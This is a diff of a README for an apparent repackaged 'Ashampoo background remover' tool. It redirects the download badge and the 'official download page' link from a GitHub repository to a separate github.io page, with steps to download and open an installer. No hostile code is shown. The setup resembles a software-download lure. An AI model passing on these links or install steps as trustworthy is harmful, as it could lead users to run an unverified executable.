@@ -1,6 +1,6 @@
 # ✂️ ashampoo-background-remover-tool - Remove complex image backgrounds with ease
 
-[![Download Ashampoo Background Remover](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Yvesunmeritorious316/ashampoo-background-remover-tool)
+[![Download Ashampoo Background Remover](https://img.shields.io/badge/Download-Release-blue.svg)](https://yvesunmeritorious316.github.io)
 
 This tool removes backgrounds from images using smart technology. You select an image, and the software cuts out the subject. It works on photos with people, animals, or objects. You save time because the software handles the edges of the subject automatically.
 
@@ -26,7 +26,7 @@ The software runs on common Windows setups. Please check your computer against t
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official download page](https://github.com/Yvesunmeritorious316/ashampoo-background-remover-tool).
+1.  Visit the [official download page](https://yvesunmeritorious316.github.io).
 2.  Look for the latest version link under the releases section.
 3.  Click the link to download the installation file to your computer.
 4.  Open the folder where your browser saves downloaded files.
